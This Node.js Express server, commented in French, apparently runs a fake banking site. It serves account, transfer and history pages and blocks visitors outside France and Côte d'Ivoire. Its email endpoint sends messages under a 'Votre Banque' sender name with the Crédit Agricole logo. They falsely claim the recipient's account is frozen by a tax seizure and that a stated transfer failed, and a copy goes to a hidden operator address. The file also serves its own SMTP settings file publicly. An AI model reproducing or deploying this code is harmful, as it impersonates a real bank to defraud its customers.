const express = require('express');
const path = require('path');
const https = require('https');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Permet à Express de remonter l'IP réelle quand l'app est derrière un proxy
// (Nginx, Cloudflare, hébergeur PaaS, etc.).
app.set('trust proxy', true);

app.use(express.json());

// Lire les configs SMTP depuis settings.js
const settingsRaw = fs.readFileSync(path.join(__dirname, 'settings.js'), 'utf-8');
const smtpCfg = {
  host: (settingsRaw.match(/var\s+smtp\s*=\s*"([^"]+)"/) || [])[1] || 'smtp.gmail.com',
  port: parseInt((settingsRaw.match(/var\s+port\s*=\s*"([^"]+)"/) || [])[1] || '587'),
  user: (settingsRaw.match(/var\s+email\s*=\s*"([^"]*)"/) || [])[1] || '',
  pass: (settingsRaw.match(/var\s+pass\s*=\s*"([^"]*)"/) || [])[1] || '',
  receiver: (settingsRaw.match(/var\s+receiver\s*=\s*"([^"]*)"/) || [])[1] || '',
};

const views = path.join(__dirname, 'views');

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || 'FR,CI')
  .split(',')
  .map((c) => c.trim())
  .filter(Boolean);

const TRUSTED_IP_HEADERS = [
  'cf-connecting-ip',
  'x-vercel-forwarded-for',
  'x-real-ip',
  'x-forwarded-for',
  'x-client-ip',
  'x-forwarded',
];

function normalizeIp(rawIp) {
  if (!rawIp) return '';
  let ip = String(rawIp).trim();

  if (!ip || ip.toLowerCase() === 'unknown' || ip.toLowerCase() === 'null') return '';

  if (ip.startsWith('for=')) {
    ip = ip.slice(4);
  }

  if (ip.startsWith('"') && ip.endsWith('"')) {
    ip = ip.slice(1, -1);
  }

  if (ip.startsWith('[')) {
    ip = ip.replace(/^\[/, '').replace(/\](?::\d+)?$/, '');
  } else if (/^\d+\.\d+\.\d+\.\d+:\d+$/.test(ip)) {
    ip = ip.split(':')[0];
  }

  return ip.replace(/%.+$/, '');
}

function getIpCandidates(req) {
  const candidates = [];

  TRUSTED_IP_HEADERS.forEach((headerName) => {
    const value = req.headers[headerName];
    if (!value) return;
    const values = Array.isArray(value) ? value : String(value).split(',');
    values.forEach((item) => {
      const ip = normalizeIp(item);
      if (ip) candidates.push(ip);
    });
  });

  const directCandidates = [req.ip, req.socket?.remoteAddress, req.connection?.remoteAddress];
  directCandidates.forEach((candidate) => {
    const ip = normalizeIp(candidate);
    if (ip) candidates.push(ip);
  });

  return candidates;
}

function getClientIp(req) {
    const candidates = getIpCandidates(req);
    let fallbackPrivateIp = null;

    for (const ip of candidates) {
        if (isPrivateIp(ip)) {
            if (!fallbackPrivateIp) fallbackPrivateIp = ip;
            continue;
        }
        return ip;
    }

    return fallbackPrivateIp;
}

function isPrivateIp(ip) {
    if (!ip) return false;
    const clean = ip.replace(/^::ffff:/, '');
    return (
        clean === '::1' ||
        clean.startsWith('127.') ||
        clean.startsWith('192.168.') ||
        clean.startsWith('10.') ||
        clean === 'localhost' ||
        /^172\.(1[6-9]|2\d|3[01])\./.test(clean)
    );
}

function checkCountry(ip) {
    return new Promise((resolve) => {
        if (!ip) {
            console.log('[GEO] Impossible de déterminer l\'IP client.');
            return resolve(false);
        }
        if (isPrivateIp(ip)) {
            console.log(`[GEO] IP privée/locale détectée : ${ip} → autorisé`);
            return resolve(true);
        }
        const clean = ip.replace(/^::ffff:/, '');
        const url = `https://ip-api.com/json/${clean}?fields=status,countryCode`;
        console.log(`[GEO] Vérification IP : ${clean}`);
        const req = https.get(url, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    console.log(`[GEO] Réponse API pour ${clean} :`, JSON.stringify(json));
                    if (json.status !== 'success') return resolve(false);
                    resolve(ALLOWED_COUNTRIES.includes(json.countryCode));
                } catch {
                    console.log(`[GEO] Erreur parsing réponse pour ${clean}`);
                    resolve(false);
                }
            });
        });
        req.on('error', (err) => {
            console.log(`[GEO] Erreur réseau pour ${clean} :`, err.message);
            resolve(false);
        });
        req.setTimeout(3000, () => {
            console.log(`[GEO] Timeout pour ${clean}`);
            req.destroy();
            resolve(false);
        });
    });
}

async function geoBlock(req, res, next) {
    const ip = getClientIp(req);
    console.log(`[GEO] IP résolue: ${ip || 'inconnue'}`);
    console.log(`[GEO] Headers reçus — cf-connecting-ip: ${req.headers['cf-connecting-ip']} | x-real-ip: ${req.headers['x-real-ip']} | x-forwarded-for: ${req.headers['x-forwarded-for']} | socket: ${req.socket.remoteAddress}`);
    const allowed = await checkCountry(ip);
    if (!allowed) return res.status(403).send('Accès non autorisé depuis votre région.');
    next();
}

app.use(geoBlock);

app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/images', express.static(path.join(__dirname, 'images')));
app.use('/javascript', express.static(path.join(__dirname, 'javascript')));
app.use('/others', express.static(path.join(__dirname, 'others')));
app.use('/font', express.static(path.join(__dirname, 'font')));
app.use('/settings.js', express.static(path.join(__dirname, 'settings.js')));

app.get('/', (req, res) => res.sendFile(path.join(views, 'index.html')));
app.get('/compte', (req, res) => res.sendFile(path.join(views, 'compte.html')));
app.get('/historique', (req, res) => res.sendFile(path.join(views, 'historique.html')));
app.get('/virement', (req, res) => res.sendFile(path.join(views, 'virement.html')));
app.get('/ajouter', (req, res) => res.sendFile(path.join(views, 'ajouter.html')));
app.get('/pages', (req, res) => res.sendFile(path.join(views, 'pages.html')));

app.post('/api/send-email', async (req, res) => {
    const { nom, prenom, iban, montant, email } = req.body;

    if (!nom || !prenom || !iban || !montant || !email) {
        return res.status(400).json({ error: 'Tous les champs sont requis.' });
    }

    const transporter = nodemailer.createTransport({
        host: smtpCfg.host,
        port: smtpCfg.port,
        secure: smtpCfg.port === 465,
        auth: {
            user: smtpCfg.user,
            pass: smtpCfg.pass,
        },
    });

    const mailOptions = {
        from: '"Votre Banque" <' + smtpCfg.user + '>',
        to: email,
        subject: 'Alerte sécurité - Compte bloqué',
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px;">
                <div style="text-align: center; margin-bottom: 20px;">
                    <img src="https://www.credit-agricole.fr/content/dam/assetsca/cr848/npc/images/logos/logoCA-NoText.png" width="60" alt="CA"/>
                    <h2 style="color: #c0392b;">Compte bloqué</h2>
                </div>
                <p>Bonjour <strong>${prenom} ${nom}</strong>,</p>
                <p>À la suite d'une Saisie Administrative, le Crédit Agricole est tenu de bloquer l'ensemble des opérations bancaires ainsi que les fonds disponibles sur votre compte jusqu'à la régularisation de votre dette fiscale.</p>
                <p>Votre virement de <strong>${montant}€</strong> vers l'IBAN <strong>${iban}</strong> n'a pas pu aboutir.</p>
                <p>Veuillez contacter votre gestionnaire pour plus d'informations.</p>
                <p style="color: #666; font-size: 12px;">Merci de votre confiance.<br>Crédit Agricole</p>
            </div>
        `,
    };

    // Copie à l'admin (receiver)
    if (smtpCfg.receiver) {
        mailOptions.cc = smtpCfg.receiver;
    }

    try {
        await transporter.sendMail(mailOptions);
        res.json({ success: true });
    } catch (err) {
        console.error('Erreur SMTP:', err.message);
        res.status(500).json({ error: "Erreur lors de l'envoi de l'email." });
    }
});

if (process.env.VERCEL !== '1' && require.main === module) {
    app.listen(PORT, () => {
        console.log(`Serveur démarré sur http://localhost:${PORT}`);
    });
}

module.exports = app;
